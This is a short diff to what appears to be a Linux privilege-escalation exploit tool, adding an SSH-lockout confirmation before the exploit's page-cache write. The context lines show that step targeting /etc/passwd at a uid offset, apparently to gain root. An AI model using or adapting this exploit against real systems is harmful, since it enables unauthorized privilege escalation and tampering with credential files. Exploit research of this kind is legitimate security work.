@@ -398,6 +398,10 @@ df_result_t copyfail_exploit(bool do_shell)
         log_bad("confirmation declined — aborting");
         return DF_OK;
     }
+    if (!ssh_lockout_check(user)) {
+        log_bad("SSH-lockout confirmation declined — aborting");
+        return DF_OK;
+    }
 
     log_step("issuing 4-byte page-cache write...");
     if (!cf_4byte_write("/etc/passwd", uid_off,
